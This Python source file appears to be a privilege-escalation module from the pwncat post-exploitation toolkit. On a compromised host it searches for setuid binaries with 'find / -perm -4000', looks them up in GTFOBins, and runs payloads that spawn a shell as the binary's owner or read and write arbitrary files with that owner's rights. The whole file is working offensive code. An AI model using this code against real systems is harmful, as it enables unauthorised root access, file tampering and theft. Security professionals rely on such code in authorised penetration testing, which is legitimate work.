#!/usr/bin/env python3
from typing import Generator, List, BinaryIO
import shlex
import sys
from time import sleep
import os
from colorama import Fore, Style
import io

import pwncat
from pwncat.privesc.base import Method, PrivescError, Technique
from pwncat.gtfobins import Binary, Stream, Capability, MethodWrapper, BinaryNotFound
from pwncat.file import RemoteBinaryPipe
from pwncat import util


class SetuidMethod(Method):

    name = "setuid"
    BINARIES = ["find", "stat"]

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        super(SetuidMethod, self).__init__(pty)

        self.users_searched = []
        self.suid_paths = {}

    def find_suid(self):

        current_user: "pwncat.db.User" = pwncat.victim.current_user

        # We've already searched for SUID binaries as this user
        count = (
            pwncat.victim.session.query(pwncat.db.SUID)
            .filter_by(user_id=current_user.id, host_id=current_user.host_id)
            .count()
        )
        if count > 0:
            return

        # Spawn a find command to locate the setuid binaries
        files = []
        with pwncat.victim.subprocess(
            "find / -perm -4000 -print 2>/dev/null", mode="r", no_job=True
        ) as stream:
            util.progress("searching for setuid binaries")
            for path in stream:
                path = path.strip().decode("utf-8")
                util.progress(
                    (
                        f"searching for setuid binaries as {Fore.GREEN}{current_user.name}{Fore.RESET}: "
                        f"{Fore.CYAN}{os.path.basename(path)}{Fore.RESET}"
                    )
                )
                files.append(path)

        util.success("searching for setuid binaries: complete", overlay=True)

        with pwncat.victim.subprocess(
            f"stat -c '%U' {' '.join(files)}", mode="r", no_job=True
        ) as stream:
            for file, user in zip(files, stream):
                user = user.strip().decode("utf-8")
                binary = pwncat.db.SUID(
                    path=file,
                    user_id=current_user.id,
                    owner_id=pwncat.victim.users[user].id,
                )
                pwncat.victim.host.suid.append(binary)

        pwncat.victim.session.commit()

    def enumerate(self, caps: Capability = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        # Update the cache for the current user
        # self.find_suid()

        known_techniques = []
        for suid in pwncat.victim.enumerate.iter("suid"):
            try:
                binary = pwncat.victim.gtfo.find_binary(suid.data.path, caps)
            except BinaryNotFound:
                continue

            for method in binary.iter_methods(suid.data.path, caps, Stream.ANY):
                known_techniques.append(
                    Technique(suid.data.owner.name, self, method, method.cap,)
                )

        return known_techniques

    def execute(self, technique: Technique):
        """ Run the specified technique """

        method = technique.ident

        # Build the payload
        payload, input_data, exit_cmd = method.build(
            shell=pwncat.victim.shell, suid=True
        )

        # Run the start commands
        # pwncat.victim.process(payload, delim=False)
        pwncat.victim.run(payload, wait=False)

        # Send required input
        pwncat.victim.client.send(input_data.encode("utf-8"))

        return exit_cmd  # remember how to close out of this privesc

    def read_file(self, filepath: str, technique: Technique) -> BinaryIO:

        method = technique.ident

        payload, input_data, exit_cmd = method.build(lfile=filepath, suid=True)

        mode = "r"
        if method.stream is Stream.RAW:
            mode += "b"

        # Send the read payload
        pipe = pwncat.victim.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        # Wrap the stream in case this is an encoded read
        pipe = method.wrap_stream(pipe)

        return pipe

    def write_file(self, filepath: str, data: bytes, technique: Technique):

        method = technique.ident

        payload, input_data, exit_cmd = method.build(
            lfile=filepath, length=len(data), suid=True
        )

        mode = "w"
        if method.stream is Stream.RAW:
            mode += "b"

        try:
            # data_printable = data.decode("utf-8").isprintable()
            # Use the custom `util.isprintable()` so we can keep newlines
            data_printable = util.isprintable(data)

        except UnicodeDecodeError:
            data_printable = False

        if method.stream == Stream.PRINT and not data_printable:
            raise PrivescError(f"{technique}: input data not printable")

        # Send the read payload
        pipe = pwncat.victim.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        # Wrap the stream in case this is an encoded write
        with method.wrap_stream(pipe) as pipe:
            pipe.write(data)

    def get_name(self, tech: Technique):
        return f"{Fore.CYAN}{tech.ident.binary_path}{Fore.RESET} ({Fore.RED}setuid{Fore.RESET})"
